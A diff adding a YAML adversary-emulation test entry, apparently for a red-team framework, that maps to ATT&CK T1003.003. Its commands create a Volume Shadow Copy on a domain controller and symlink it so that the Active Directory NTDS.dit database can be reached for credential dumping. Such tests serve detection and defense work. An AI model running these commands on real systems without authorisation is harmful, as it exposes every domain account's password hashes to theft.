@@ -1,0 +1,16 @@
+- id: 6db4ece8-c65e-5bd4-9dbd-04e12de81b2b
+  name: Soumaia ART Tests - Create Symlink to Volume Shadow Copy
+  description: 'This test is intended to be run on a domain Controller.
+
+
+    The Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy. (requires elevation)'
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: 'OS Credential Dumping: NTDS'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          vssadmin.exe create shadow /for=C:
+          mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
